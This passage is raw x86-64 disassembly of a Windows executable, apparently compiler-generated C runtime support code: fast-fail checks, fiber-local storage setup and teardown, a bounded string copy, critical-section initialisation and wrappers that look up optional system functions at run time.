   1400039c7:	48 83 c4 20          	add    $0x20,%rsp
   1400039cb:	5f                   	pop    %rdi
   1400039cc:	c3                   	ret
   1400039cd:	cc                   	int3
   1400039ce:	cc                   	int3
   1400039cf:	cc                   	int3
   1400039d0:	cc                   	int3
   1400039d1:	cc                   	int3
   1400039d2:	cc                   	int3
   1400039d3:	cc                   	int3
   1400039d4:	cc                   	int3
   1400039d5:	cc                   	int3
   1400039d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400039dd:	00 00 00 
   1400039e0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400039e5:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   1400039ea:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   1400039ef:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   1400039f6:	eb 08                	jmp    0x140003a00
   1400039f8:	cc                   	int3
   1400039f9:	cc                   	int3
   1400039fa:	cc                   	int3
   1400039fb:	cc                   	int3
   1400039fc:	cc                   	int3
   1400039fd:	cc                   	int3
   1400039fe:	66 90                	xchg   %ax,%ax
   140003a00:	c3                   	ret
   140003a01:	cc                   	int3
   140003a02:	cc                   	int3
   140003a03:	cc                   	int3
   140003a04:	cc                   	int3
   140003a05:	cc                   	int3
   140003a06:	cc                   	int3
   140003a07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003a0e:	00 00 
   140003a10:	c3                   	ret
   140003a11:	cc                   	int3
   140003a12:	cc                   	int3
   140003a13:	cc                   	int3
   140003a14:	48 8b 05 e5 65 01 00 	mov    0x165e5(%rip),%rax        # 0x14001a000
   140003a1b:	48 8d 15 52 e1 ff ff 	lea    -0x1eae(%rip),%rdx        # 0x140001b74
   140003a22:	48 3b c2             	cmp    %rdx,%rax
   140003a25:	74 23                	je     0x140003a4a
   140003a27:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140003a2e:	00 00 
   140003a30:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140003a37:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140003a3b:	72 06                	jb     0x140003a43
   140003a3d:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140003a41:	76 07                	jbe    0x140003a4a
   140003a43:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140003a48:	cd 29                	int    $0x29
   140003a4a:	c3                   	ret
   140003a4b:	cc                   	int3
   140003a4c:	48 83 ec 28          	sub    $0x28,%rsp
   140003a50:	e8 83 21 00 00       	call   0x140005bd8
   140003a55:	48 85 c0             	test   %rax,%rax
   140003a58:	74 0a                	je     0x140003a64
   140003a5a:	b9 16 00 00 00       	mov    $0x16,%ecx
   140003a5f:	e8 a4 21 00 00       	call   0x140005c08
   140003a64:	f6 05 f5 35 01 00 02 	testb  $0x2,0x135f5(%rip)        # 0x140017060
   140003a6b:	74 2a                	je     0x140003a97
   140003a6d:	b9 17 00 00 00       	mov    $0x17,%ecx
   140003a72:	ff 15 20 1e 01 00    	call   *0x11e20(%rip)        # 0x140015898
   140003a78:	85 c0                	test   %eax,%eax
   140003a7a:	74 07                	je     0x140003a83
   140003a7c:	b9 07 00 00 00       	mov    $0x7,%ecx
   140003a81:	cd 29                	int    $0x29
   140003a83:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003a89:	ba 15 00 00 40       	mov    $0x40000015,%edx
   140003a8e:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140003a92:	e8 a1 1e 00 00       	call   0x140005938
   140003a97:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003a9c:	e8 63 ec ff ff       	call   0x140002704
   140003aa1:	cc                   	int3
   140003aa2:	cc                   	int3
   140003aa3:	cc                   	int3
   140003aa4:	48 83 ec 28          	sub    $0x28,%rsp
   140003aa8:	48 8d 0d 3d 01 00 00 	lea    0x13d(%rip),%rcx        # 0x140003bec
   140003aaf:	e8 dc 4a 00 00       	call   0x140008590
   140003ab4:	89 05 aa 35 01 00    	mov    %eax,0x135aa(%rip)        # 0x140017064
   140003aba:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003abd:	74 25                	je     0x140003ae4
   140003abf:	48 8d 15 1a 47 01 00 	lea    0x1471a(%rip),%rdx        # 0x1400181e0
   140003ac6:	8b c8                	mov    %eax,%ecx
   140003ac8:	e8 9b 4b 00 00       	call   0x140008668
   140003acd:	85 c0                	test   %eax,%eax
   140003acf:	74 0e                	je     0x140003adf
   140003ad1:	c7 05 7d 47 01 00 fe 	movl   $0xfffffffe,0x1477d(%rip)        # 0x140018258
   140003ad8:	ff ff ff 
   140003adb:	b0 01                	mov    $0x1,%al
   140003add:	eb 07                	jmp    0x140003ae6
   140003adf:	e8 08 00 00 00       	call   0x140003aec
   140003ae4:	32 c0                	xor    %al,%al
   140003ae6:	48 83 c4 28          	add    $0x28,%rsp
   140003aea:	c3                   	ret
   140003aeb:	cc                   	int3
   140003aec:	48 83 ec 28          	sub    $0x28,%rsp
   140003af0:	8b 0d 6e 35 01 00    	mov    0x1356e(%rip),%ecx        # 0x140017064
   140003af6:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140003af9:	74 0c                	je     0x140003b07
   140003afb:	e8 d8 4a 00 00       	call   0x1400085d8
   140003b00:	83 0d 5d 35 01 00 ff 	orl    $0xffffffff,0x1355d(%rip)        # 0x140017064
   140003b07:	b0 01                	mov    $0x1,%al
   140003b09:	48 83 c4 28          	add    $0x28,%rsp
   140003b0d:	c3                   	ret
   140003b0e:	cc                   	int3
   140003b0f:	cc                   	int3
   140003b10:	48 83 ec 28          	sub    $0x28,%rsp
   140003b14:	e8 13 00 00 00       	call   0x140003b2c
   140003b19:	48 85 c0             	test   %rax,%rax
   140003b1c:	74 05                	je     0x140003b23
   140003b1e:	48 83 c4 28          	add    $0x28,%rsp
   140003b22:	c3                   	ret
   140003b23:	e8 24 ff ff ff       	call   0x140003a4c
   140003b28:	cc                   	int3
   140003b29:	cc                   	int3
   140003b2a:	cc                   	int3
   140003b2b:	cc                   	int3
   140003b2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003b31:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003b36:	57                   	push   %rdi
   140003b37:	48 83 ec 20          	sub    $0x20,%rsp
   140003b3b:	83 3d 22 35 01 00 ff 	cmpl   $0xffffffff,0x13522(%rip)        # 0x140017064
   140003b42:	75 07                	jne    0x140003b4b
   140003b44:	33 c0                	xor    %eax,%eax
   140003b46:	e9 90 00 00 00       	jmp    0x140003bdb
   140003b4b:	ff 15 b7 1c 01 00    	call   *0x11cb7(%rip)        # 0x140015808
   140003b51:	8b 0d 0d 35 01 00    	mov    0x1350d(%rip),%ecx        # 0x140017064
   140003b57:	8b f8                	mov    %eax,%edi
   140003b59:	e8 c2 4a 00 00       	call   0x140008620
   140003b5e:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140003b62:	33 f6                	xor    %esi,%esi
   140003b64:	48 3b c2             	cmp    %rdx,%rax
   140003b67:	74 67                	je     0x140003bd0
   140003b69:	48 85 c0             	test   %rax,%rax
   140003b6c:	74 05                	je     0x140003b73
   140003b6e:	48 8b f0             	mov    %rax,%rsi
   140003b71:	eb 5d                	jmp    0x140003bd0
   140003b73:	8b 0d eb 34 01 00    	mov    0x134eb(%rip),%ecx        # 0x140017064
   140003b79:	e8 ea 4a 00 00       	call   0x140008668
   140003b7e:	85 c0                	test   %eax,%eax
   140003b80:	74 4e                	je     0x140003bd0
   140003b82:	ba 80 00 00 00       	mov    $0x80,%edx
   140003b87:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140003b8a:	e8 f9 49 00 00       	call   0x140008588
   140003b8f:	8b 0d cf 34 01 00    	mov    0x134cf(%rip),%ecx        # 0x140017064
   140003b95:	48 8b d8             	mov    %rax,%rbx
   140003b98:	48 85 c0             	test   %rax,%rax
   140003b9b:	74 24                	je     0x140003bc1
   140003b9d:	48 8b d0             	mov    %rax,%rdx
   140003ba0:	e8 c3 4a 00 00       	call   0x140008668
   140003ba5:	85 c0                	test   %eax,%eax
   140003ba7:	74 12                	je     0x140003bbb
   140003ba9:	48 8b c3             	mov    %rbx,%rax
   140003bac:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140003bb3:	48 8b de             	mov    %rsi,%rbx
   140003bb6:	48 8b f0             	mov    %rax,%rsi
   140003bb9:	eb 0d                	jmp    0x140003bc8
   140003bbb:	8b 0d a3 34 01 00    	mov    0x134a3(%rip),%ecx        # 0x140017064
   140003bc1:	33 d2                	xor    %edx,%edx
   140003bc3:	e8 a0 4a 00 00       	call   0x140008668
   140003bc8:	48 8b cb             	mov    %rbx,%rcx
   140003bcb:	e8 3c 00 00 00       	call   0x140003c0c
   140003bd0:	8b cf                	mov    %edi,%ecx
   140003bd2:	ff 15 30 1d 01 00    	call   *0x11d30(%rip)        # 0x140015908
   140003bd8:	48 8b c6             	mov    %rsi,%rax
   140003bdb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003be0:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003be5:	48 83 c4 20          	add    $0x20,%rsp
   140003be9:	5f                   	pop    %rdi
   140003bea:	c3                   	ret
   140003beb:	cc                   	int3
   140003bec:	48 83 ec 28          	sub    $0x28,%rsp
   140003bf0:	48 85 c9             	test   %rcx,%rcx
   140003bf3:	74 11                	je     0x140003c06
   140003bf5:	48 8d 05 e4 45 01 00 	lea    0x145e4(%rip),%rax        # 0x1400181e0
   140003bfc:	48 3b c8             	cmp    %rax,%rcx
   140003bff:	74 05                	je     0x140003c06
   140003c01:	e8 06 00 00 00       	call   0x140003c0c
   140003c06:	48 83 c4 28          	add    $0x28,%rsp
   140003c0a:	c3                   	ret
   140003c0b:	cc                   	int3
   140003c0c:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   140003c13:	00 
   140003c14:	8b 44 24 10          	mov    0x10(%rsp),%eax
   140003c18:	e9 b7 1b 00 00       	jmp    0x1400057d4
   140003c1d:	cc                   	int3
   140003c1e:	cc                   	int3
   140003c1f:	cc                   	int3
   140003c20:	40 53                	rex push %rbx
   140003c22:	48 83 ec 20          	sub    $0x20,%rsp
   140003c26:	33 db                	xor    %ebx,%ebx
   140003c28:	48 85 c9             	test   %rcx,%rcx
   140003c2b:	74 0c                	je     0x140003c39
   140003c2d:	48 85 d2             	test   %rdx,%rdx
   140003c30:	74 07                	je     0x140003c39
   140003c32:	4d 85 c0             	test   %r8,%r8
   140003c35:	75 1b                	jne    0x140003c52
   140003c37:	88 19                	mov    %bl,(%rcx)
   140003c39:	e8 be 26 00 00       	call   0x1400062fc
   140003c3e:	bb 16 00 00 00       	mov    $0x16,%ebx
   140003c43:	89 18                	mov    %ebx,(%rax)
   140003c45:	e8 86 1c 00 00       	call   0x1400058d0
   140003c4a:	8b c3                	mov    %ebx,%eax
   140003c4c:	48 83 c4 20          	add    $0x20,%rsp
   140003c50:	5b                   	pop    %rbx
   140003c51:	c3                   	ret
   140003c52:	4c 8b c9             	mov    %rcx,%r9
   140003c55:	4c 2b c1             	sub    %rcx,%r8
   140003c58:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   140003c5c:	41 88 01             	mov    %al,(%r9)
   140003c5f:	49 ff c1             	inc    %r9
   140003c62:	84 c0                	test   %al,%al
   140003c64:	74 06                	je     0x140003c6c
   140003c66:	48 83 ea 01          	sub    $0x1,%rdx
   140003c6a:	75 ec                	jne    0x140003c58
   140003c6c:	48 85 d2             	test   %rdx,%rdx
   140003c6f:	75 d9                	jne    0x140003c4a
   140003c71:	88 19                	mov    %bl,(%rcx)
   140003c73:	e8 84 26 00 00       	call   0x1400062fc
   140003c78:	bb 22 00 00 00       	mov    $0x22,%ebx
   140003c7d:	eb c4                	jmp    0x140003c43
   140003c7f:	cc                   	int3
   140003c80:	48 83 ec 28          	sub    $0x28,%rsp
   140003c84:	45 33 c0             	xor    %r8d,%r8d
   140003c87:	48 8d 0d 3a 46 01 00 	lea    0x1463a(%rip),%rcx        # 0x1400182c8
   140003c8e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140003c93:	e8 24 4a 00 00       	call   0x1400086bc
   140003c98:	85 c0                	test   %eax,%eax
   140003c9a:	74 0a                	je     0x140003ca6
   140003c9c:	ff 05 4e 46 01 00    	incl   0x1464e(%rip)        # 0x1400182f0
   140003ca2:	b0 01                	mov    $0x1,%al
   140003ca4:	eb 07                	jmp    0x140003cad
   140003ca6:	e8 09 00 00 00       	call   0x140003cb4
   140003cab:	32 c0                	xor    %al,%al
   140003cad:	48 83 c4 28          	add    $0x28,%rsp
   140003cb1:	c3                   	ret
   140003cb2:	cc                   	int3
   140003cb3:	cc                   	int3
   140003cb4:	40 53                	rex push %rbx
   140003cb6:	48 83 ec 20          	sub    $0x20,%rsp
   140003cba:	8b 1d 30 46 01 00    	mov    0x14630(%rip),%ebx        # 0x1400182f0
   140003cc0:	eb 1d                	jmp    0x140003cdf
   140003cc2:	48 8d 05 ff 45 01 00 	lea    0x145ff(%rip),%rax        # 0x1400182c8
   140003cc9:	ff cb                	dec    %ebx
   140003ccb:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140003ccf:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140003cd3:	ff 15 8f 1a 01 00    	call   *0x11a8f(%rip)        # 0x140015768
   140003cd9:	ff 0d 11 46 01 00    	decl   0x14611(%rip)        # 0x1400182f0
   140003cdf:	85 db                	test   %ebx,%ebx
   140003ce1:	75 df                	jne    0x140003cc2
   140003ce3:	b0 01                	mov    $0x1,%al
   140003ce5:	48 83 c4 20          	add    $0x20,%rsp
   140003ce9:	5b                   	pop    %rbx
   140003cea:	c3                   	ret
   140003ceb:	cc                   	int3
   140003cec:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   140003cf1:	48 8d 3d a8 46 01 00 	lea    0x146a8(%rip),%rdi        # 0x1400183a0
   140003cf8:	48 8d 05 b1 47 01 00 	lea    0x147b1(%rip),%rax        # 0x1400184b0
   140003cff:	48 3b c7             	cmp    %rdi,%rax
   140003d02:	48 8b 05 2f 33 01 00 	mov    0x1332f(%rip),%rax        # 0x140017038
   140003d09:	48 1b c9             	sbb    %rcx,%rcx
   140003d0c:	48 f7 d1             	not    %rcx
   140003d0f:	83 e1 22             	and    $0x22,%ecx
   140003d12:	f3 48 ab             	rep stos %rax,(%rdi)
   140003d15:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140003d1a:	b0 01                	mov    $0x1,%al
   140003d1c:	c3                   	ret
   140003d1d:	cc                   	int3
   140003d1e:	cc                   	int3
   140003d1f:	cc                   	int3
   140003d20:	40 53                	rex push %rbx
   140003d22:	48 83 ec 20          	sub    $0x20,%rsp
   140003d26:	84 c9                	test   %cl,%cl
   140003d28:	75 2f                	jne    0x140003d59
   140003d2a:	48 8d 1d cf 45 01 00 	lea    0x145cf(%rip),%rbx        # 0x140018300
   140003d31:	48 8b 0b             	mov    (%rbx),%rcx
   140003d34:	48 85 c9             	test   %rcx,%rcx
   140003d37:	74 10                	je     0x140003d49
   140003d39:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140003d3d:	74 06                	je     0x140003d45
   140003d3f:	ff 15 63 1a 01 00    	call   *0x11a63(%rip)        # 0x1400157a8
   140003d45:	48 83 23 00          	andq   $0x0,(%rbx)
   140003d49:	48 83 c3 08          	add    $0x8,%rbx
   140003d4d:	48 8d 05 4c 46 01 00 	lea    0x1464c(%rip),%rax        # 0x1400183a0
   140003d54:	48 3b d8             	cmp    %rax,%rbx
   140003d57:	75 d8                	jne    0x140003d31
   140003d59:	b0 01                	mov    $0x1,%al
   140003d5b:	48 83 c4 20          	add    $0x20,%rsp
   140003d5f:	5b                   	pop    %rbx
   140003d60:	c3                   	ret
   140003d61:	cc                   	int3
   140003d62:	cc                   	int3
   140003d63:	cc                   	int3
   140003d64:	48 83 ec 28          	sub    $0x28,%rsp
   140003d68:	4c 8d 0d 85 ad 00 00 	lea    0xad85(%rip),%r9        # 0x14000eaf4
   140003d6f:	33 c9                	xor    %ecx,%ecx
   140003d71:	4c 8d 05 78 ad 00 00 	lea    0xad78(%rip),%r8        # 0x14000eaf0
   140003d78:	48 8d 15 f9 f4 00 00 	lea    0xf4f9(%rip),%rdx        # 0x140013278
   140003d7f:	e8 04 04 00 00       	call   0x140004188
   140003d84:	48 85 c0             	test   %rax,%rax
   140003d87:	74 0b                	je     0x140003d94
   140003d89:	48 83 c4 28          	add    $0x28,%rsp
   140003d8d:	48 ff 25 7c 62 01 00 	rex.W jmp *0x1627c(%rip)        # 0x14001a010
   140003d94:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d99:	48 83 c4 28          	add    $0x28,%rsp
   140003d9d:	c3                   	ret
   140003d9e:	cc                   	int3
   140003d9f:	cc                   	int3
   140003da0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003da5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003daa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003daf:	57                   	push   %rdi
   140003db0:	48 83 ec 50          	sub    $0x50,%rsp
   140003db4:	41 8b d9             	mov    %r9d,%ebx
   140003db7:	49 8b f8             	mov    %r8,%rdi
   140003dba:	8b f2                	mov    %edx,%esi
   140003dbc:	4c 8d 0d 3d ad 00 00 	lea    0xad3d(%rip),%r9        # 0x14000eb00
   140003dc3:	48 8b e9             	mov    %rcx,%rbp
   140003dc6:	4c 8d 05 2b ad 00 00 	lea    0xad2b(%rip),%r8        # 0x14000eaf8
   140003dcd:	48 8d 15 14 f3 00 00 	lea    0xf314(%rip),%rdx        # 0x1400130e8
   140003dd4:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003dd9:	e8 aa 03 00 00       	call   0x140004188
   140003dde:	48 85 c0             	test   %rax,%rax
   140003de1:	74 52                	je     0x140003e35
   140003de3:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
   140003dea:	00 
   140003deb:	44 8b cb             	mov    %ebx,%r9d
   140003dee:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140003df5:	00 
   140003df6:	8b d6                	mov    %esi,%edx
   140003df8:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140003dfd:	4c 8b c7             	mov    %rdi,%r8
   140003e00:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140003e05:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140003e0c:	00 
   140003e0d:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003e12:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140003e19:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140003e1d:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140003e24:	00 
   140003e25:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003e2a:	48 8b cd             	mov    %rbp,%rcx
   140003e2d:	ff 15 dd 61 01 00    	call   *0x161dd(%rip)        # 0x14001a010
   140003e33:	eb 32                	jmp    0x140003e67
   140003e35:	33 d2                	xor    %edx,%edx
   140003e37:	48 8b cd             	mov    %rbp,%rcx
   140003e3a:	e8 a9 02 00 00       	call   0x1400040e8
   140003e3f:	8b c8                	mov    %eax,%ecx
   140003e41:	44 8b cb             	mov    %ebx,%r9d
   140003e44:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   140003e4b:	4c 8b c7             	mov    %rdi,%r8
   140003e4e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003e52:	8b d6                	mov    %esi,%edx
   140003e54:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140003e5b:	00 
   140003e5c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003e61:	ff 15 f1 18 01 00    	call   *0x118f1(%rip)        # 0x140015758
   140003e67:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140003e6c:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140003e71:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140003e76:	48 83 c4 50          	add    $0x50,%rsp
   140003e7a:	5f                   	pop    %rdi
   140003e7b:	c3                   	ret
   140003e7c:	40 53                	rex push %rbx
   140003e7e:	48 83 ec 20          	sub    $0x20,%rsp
   140003e82:	48 8b d9             	mov    %rcx,%rbx
   140003e85:	4c 8d 0d 7c ac 00 00 	lea    0xac7c(%rip),%r9        # 0x14000eb08
   140003e8c:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003e91:	4c 8d 05 68 ac 00 00 	lea    0xac68(%rip),%r8        # 0x14000eb00
   140003e98:	48 8d 15 b9 f3 00 00 	lea    0xf3b9(%rip),%rdx        # 0x140013258
   140003e9f:	e8 e4 02 00 00       	call   0x140004188
   140003ea4:	48 85 c0             	test   %rax,%rax
   140003ea7:	74 0f                	je     0x140003eb8
   140003ea9:	48 8b cb             	mov    %rbx,%rcx
   140003eac:	48 83 c4 20          	add    $0x20,%rsp
   140003eb0:	5b                   	pop    %rbx
   140003eb1:	48 ff 25 58 61 01 00 	rex.W jmp *0x16158(%rip)        # 0x14001a010
   140003eb8:	48 83 c4 20          	add    $0x20,%rsp
   140003ebc:	5b                   	pop    %rbx
   140003ebd:	48 ff 25 64 1a 01 00 	rex.W jmp *0x11a64(%rip)        # 0x140015928
   140003ec4:	40 53                	rex push %rbx
   140003ec6:	48 83 ec 20          	sub    $0x20,%rsp
   140003eca:	8b d9                	mov    %ecx,%ebx
   140003ecc:	4c 8d 0d 3d ac 00 00 	lea    0xac3d(%rip),%r9        # 0x14000eb10
   140003ed3:	b9 04 00 00 00       	mov    $0x4,%ecx
   140003ed8:	4c 8d 05 29 ac 00 00 	lea    0xac29(%rip),%r8        # 0x14000eb08
   140003edf:	48 8d 15 32 f3 00 00 	lea    0xf332(%rip),%rdx        # 0x140013218
   140003ee6:	e8 9d 02 00 00       	call   0x140004188
   140003eeb:	8b cb                	mov    %ebx,%ecx
   140003eed:	48 85 c0             	test   %rax,%rax
   140003ef0:	74 0c                	je     0x140003efe
   140003ef2:	48 83 c4 20          	add    $0x20,%rsp
   140003ef6:	5b                   	pop    %rbx
   140003ef7:	48 ff 25 12 61 01 00 	rex.W jmp *0x16112(%rip)        # 0x14001a010
   140003efe:	48 83 c4 20          	add    $0x20,%rsp
   140003f02:	5b                   	pop    %rbx
   140003f03:	48 ff 25 26 1a 01 00 	rex.W jmp *0x11a26(%rip)        # 0x140015930
   140003f0a:	cc                   	int3
   140003f0b:	cc                   	int3
   140003f0c:	40 53                	rex push %rbx
   140003f0e:	48 83 ec 20          	sub    $0x20,%rsp
   140003f12:	8b d9                	mov    %ecx,%ebx
   140003f14:	4c 8d 0d fd ab 00 00 	lea    0xabfd(%rip),%r9        # 0x14000eb18
   140003f1b:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003f20:	4c 8d 05 e9 ab 00 00 	lea    0xabe9(%rip),%r8        # 0x14000eb10
   140003f27:	48 8d 15 d2 f2 00 00 	lea    0xf2d2(%rip),%rdx        # 0x140013200
   140003f2e:	e8 55 02 00 00       	call   0x140004188
   140003f33:	8b cb                	mov    %ebx,%ecx
   140003f35:	48 85 c0             	test   %rax,%rax
   140003f38:	74 0c                	je     0x140003f46
   140003f3a:	48 83 c4 20          	add    $0x20,%rsp
   140003f3e:	5b                   	pop    %rbx
   140003f3f:	48 ff 25 ca 60 01 00 	rex.W jmp *0x160ca(%rip)        # 0x14001a010
   140003f46:	48 83 c4 20          	add    $0x20,%rsp
   140003f4a:	5b                   	pop    %rbx
   140003f4b:	48 ff 25 e6 19 01 00 	rex.W jmp *0x119e6(%rip)        # 0x140015938
   140003f52:	cc                   	int3
   140003f53:	cc                   	int3
   140003f54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f59:	57                   	push   %rdi
   140003f5a:	48 83 ec 20          	sub    $0x20,%rsp
   140003f5e:	48 8b da             	mov    %rdx,%rbx
   140003f61:	4c 8d 0d b8 ab 00 00 	lea    0xabb8(%rip),%r9        # 0x14000eb20
   140003f68:	8b f9                	mov    %ecx,%edi
   140003f6a:	48 8d 15 7f f2 00 00 	lea    0xf27f(%rip),%rdx        # 0x1400131f0
   140003f71:	b9 06 00 00 00       	mov    $0x6,%ecx
   140003f76:	4c 8d 05 9b ab 00 00 	lea    0xab9b(%rip),%r8        # 0x14000eb18
   140003f7d:	e8 06 02 00 00       	call   0x140004188
   140003f82:	48 8b d3             	mov    %rbx,%rdx
   140003f85:	8b cf                	mov    %edi,%ecx
   140003f87:	48 85 c0             	test   %rax,%rax
   140003f8a:	74 08                	je     0x140003f94
   140003f8c:	ff 15 7e 60 01 00    	call   *0x1607e(%rip)        # 0x14001a010
   140003f92:	eb 06                	jmp    0x140003f9a
   140003f94:	ff 15 a6 19 01 00    	call   *0x119a6(%rip)        # 0x140015940
   140003f9a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003f9f:	48 83 c4 20          	add    $0x20,%rsp
   140003fa3:	5f                   	pop    %rdi
   140003fa4:	c3                   	ret
   140003fa5:	cc                   	int3
   140003fa6:	cc                   	int3
   140003fa7:	cc                   	int3
   140003fa8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003fad:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003fb2:	57                   	push   %rdi
   140003fb3:	48 83 ec 20          	sub    $0x20,%rsp
   140003fb7:	41 8b f0             	mov    %r8d,%esi
   140003fba:	4c 8d 0d 67 ab 00 00 	lea    0xab67(%rip),%r9        # 0x14000eb28
   140003fc1:	8b da                	mov    %edx,%ebx
   140003fc3:	4c 8d 05 56 ab 00 00 	lea    0xab56(%rip),%r8        # 0x14000eb20
   140003fca:	48 8b f9             	mov    %rcx,%rdi
   140003fcd:	48 8d 15 e4 f0 00 00 	lea    0xf0e4(%rip),%rdx        # 0x1400130b8
   140003fd4:	b9 12 00 00 00       	mov    $0x12,%ecx
   140003fd9:	e8 aa 01 00 00       	call   0x140004188
   140003fde:	8b d3                	mov    %ebx,%edx
   140003fe0:	48 8b cf             	mov    %rdi,%rcx
   140003fe3:	48 85 c0             	test   %rax,%rax
   140003fe6:	74 0b                	je     0x140003ff3
   140003fe8:	44 8b c6             	mov    %esi,%r8d
   140003feb:	ff 15 1f 60 01 00    	call   *0x1601f(%rip)        # 0x14001a010
   140003ff1:	eb 06                	jmp    0x140003ff9
   140003ff3:	ff 15 87 18 01 00    	call   *0x11887(%rip)        # 0x140015880
   140003ff9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003ffe:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004003:	48 83 c4 20          	add    $0x20,%rsp
   140004007:	5f                   	pop    %rdi
   140004008:	c3                   	ret
   140004009:	cc                   	int3
   14000400a:	cc                   	int3
   14000400b:	cc                   	int3
   14000400c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004011:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004016:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000401b:	57                   	push   %rdi
   14000401c:	48 83 ec 50          	sub    $0x50,%rsp
   140004020:	41 8b d9             	mov    %r9d,%ebx
   140004023:	49 8b f8             	mov    %r8,%rdi
   140004026:	8b f2                	mov    %edx,%esi
   140004028:	4c 8d 0d 01 ab 00 00 	lea    0xab01(%rip),%r9        # 0x14000eb30
   14000402f:	48 8b e9             	mov    %rcx,%rbp
   140004032:	4c 8d 05 ef aa 00 00 	lea    0xaaef(%rip),%r8        # 0x14000eb28
   140004039:	48 8d 15 98 f0 00 00 	lea    0xf098(%rip),%rdx        # 0x1400130d8
   140004040:	b9 14 00 00 00       	mov    $0x14,%ecx
   140004045:	e8 3e 01 00 00       	call   0x140004188
   14000404a:	48 85 c0             	test   %rax,%rax
   14000404d:	74 52                	je     0x1400040a1
   14000404f:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
   140004056:	00 
   140004057:	44 8b cb             	mov    %ebx,%r9d
   14000405a:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140004061:	00 
   140004062:	8b d6                	mov    %esi,%edx
   140004064:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140004069:	4c 8b c7             	mov    %rdi,%r8
   14000406c:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140004071:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140004078:	00 
   140004079:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000407e:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140004085:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140004089:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140004090:	00 
   140004091:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004096:	48 8b cd             	mov    %rbp,%rcx
   140004099:	ff 15 71 5f 01 00    	call   *0x15f71(%rip)        # 0x14001a010
   14000409f:	eb 32                	jmp    0x1400040d3
   1400040a1:	33 d2                	xor    %edx,%edx
   1400040a3:	48 8b cd             	mov    %rbp,%rcx
   1400040a6:	e8 3d 00 00 00       	call   0x1400040e8
   1400040ab:	8b c8                	mov    %eax,%ecx
   1400040ad:	44 8b cb             	mov    %ebx,%r9d
   1400040b0:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   1400040b7:	4c 8b c7             	mov    %rdi,%r8
   1400040ba:	89 44 24 28          	mov    %eax,0x28(%rsp)
